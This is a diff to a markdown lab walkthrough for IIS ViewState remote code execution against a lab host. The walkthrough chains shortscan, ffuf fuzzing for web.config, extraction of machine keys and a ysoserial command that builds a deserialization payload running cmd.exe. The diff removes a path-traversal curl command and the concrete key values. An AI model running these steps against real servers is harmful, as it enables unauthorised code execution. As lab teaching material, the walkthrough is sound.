@@ -1,11 +1,5 @@
 ## IIS ViewState RCE - Attack Walkthrough
 
-### Prerequisites
-- Target: `http://iis.lab/main/`
-- The `/main` directory is our application root for this exercise
-
----
-
 ### Step 1: Discover Files with Shortscan
 
 Run shortscan against the target to find exposed files and shortnames:
@@ -15,20 +9,18 @@ shortscan http://iis.lab/main/
 ```
 
 Shortscan will return two things:
-- **Full filenames** (e.g., `home.aspx`, `download.aspx`) — visit these in your browser or curl them
-- **Shortnames** (8.3 format, e.g., `HOME~1.ASP`) — these are Windows short filenames that can reveal hidden files
+- **Full filenames** — visit these in your browser or curl them
+- **Shortnames** — these are Windows short filenames that can reveal hidden files
 
-Take note of any interesting findings. In our case, `download.aspx?file=` is the key to reading `web.config`.
+Take note of any interesting findings. 
 
 ---
 
 ### Step 2: Generate a Wordlist from Shortnames
 
-Use `ggnsw` (Generate Generic Normal Shortname Wordlist) to expand shortnames into full potential filenames:
+Use `ggnsw` (Generate Generic Normal Shortname Wordlist) to expand shortnames into full potential filenames.
 
-```bash
-ggnsw -i shortnames.txt -o wordlist.txt
-```
+Install ggsnw from here: https://github.com/yazdanctx/ggsnw
 
 This creates a wordlist of possible full filenames based on the shortnames discovered by shortscan. Shortnames only show the first 6 characters + extension, so `ggnsw` helps guess the rest.
 
@@ -43,12 +35,6 @@ ffuf -u http://iis.lab/main/FUZZ -w wordlist.txt -mc 200,403
 ```
 
 **Goal:** Find and access `web.config` to extract the machine keys.
-
-If `web.config` is blocked from direct access (403), use the LFI vulnerability in `download.aspx`:
-
-```bash
-curl "http://iis.lab/main/download.aspx?file=../../web.config"
-```
 
 ---
 
@@ -74,18 +60,7 @@ You need:
 
 ### Step 5: Get the Generator Key
 
-The generator is a page-specific identifier. Get it from the HTML source of the target page:
-
-```bash
-curl http://iis.lab/main/home.aspx -s | grep VIEWSTATEGENERATOR
-```
-
-You'll see something like:
-```html
-<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" />
-```
-
-The value (`CA0B0334`) is your generator.
+The generator (VIEWSTATEGENERATOR) is a page-specific identifier. Get it from the HTML source of the target page:
 
 ---
 
@@ -94,7 +69,7 @@ The value (`CA0B0334`) is your generator.
 Use ysoserial to craft a ViewState payload that executes a command:
 
 ```powershell
-.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c whoami > C:\Windows\Temp\pwned.txt" --validationkey=CB2721ABDAF8E9DC516D621D8B8BF13A2C9E868FEA8B4F7D8C8F8F8F8F8F8F8F --decryptionkey=ABCD1234567890ABCD1234567890ABCD --validationalg="SHA1" --decryptionalg="AES" --generator=CA0B0334 --path="/main/home.aspx" --apppath="/main/"
+.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c whoami > C:\Windows\Temp\pwned.txt" --validationkey=<KEY> —decryptionkey=<KEY> --validationalg="SHA1" --decryptionalg="AES" --generator=<KEY> --path="/main/home.aspx" --apppath="/main/"
 ```
 
 **Parameters explained:**
